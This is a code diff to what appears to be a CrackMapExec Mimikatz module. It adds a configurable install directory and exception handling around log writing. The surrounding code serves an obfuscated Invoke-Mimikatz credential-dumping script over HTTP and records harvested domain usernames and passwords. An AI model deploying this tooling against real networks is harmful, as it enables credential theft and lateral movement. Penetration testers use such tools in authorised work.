@@ -1,6 +1,9 @@
 from core.helpers import create_ps_command, obfs_ps_script, gen_random_string, validate_ntlm
 from datetime import datetime
 import re
+import os 
+
+base_dir = os.getenv('CRACKMAPEXEC_BASEDIR', "/opt/crackmapexec")
 
 class CMEModule:
     '''
@@ -53,7 +56,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open('data/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1', 'r') as ps_script:
+            with open(os.path.join(base_dir,'data/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1'), 'r') as ps_script:
                 ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                 request.wfile.write(ps_script)
 
@@ -213,6 +216,9 @@ class CMEModule:
                     context.log.highlight('{}\\{}:{}'.format(domain, username, password))
 
         log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
-        with open('logs/' + log_name, 'w') as mimikatz_output:
-            mimikatz_output.write(data)
-        context.log.info("Saved Mimikatz's output to {}".format(log_name))
+        try:
+            with open('logs/' + log_name, 'w') as mimikatz_output:
+                mimikatz_output.write(data)
+            context.log.info("Saved Mimikatz's output to {}".format(log_name))
+        except Exception:
+                pass
